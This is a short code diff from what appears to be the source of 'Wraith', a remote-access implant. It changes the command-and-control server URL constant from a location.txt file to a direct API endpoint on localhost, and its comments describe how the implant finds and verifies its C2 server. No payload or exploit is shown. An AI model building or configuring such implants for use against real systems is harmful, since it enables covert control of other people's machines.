@@ -13,7 +13,7 @@ is a good choice but any raw text hosting will do. If you are sure that the API
 URL will never change, you can simply put the API URL directly here
 but this is not recommended as changing the API URL will then result in losing
 all Wraiths with the previous URL hard-coded. */
-const setCCSERVERGETURL string = "http://localhost/location.txt"
+const setCCSERVERGETURL string = "http://localhost/API/api.php"
 
 /* This is a prefix added to every encrypted API request sent by the Wraith and
 expected at the start of the API response. This is to verify that the Wraith
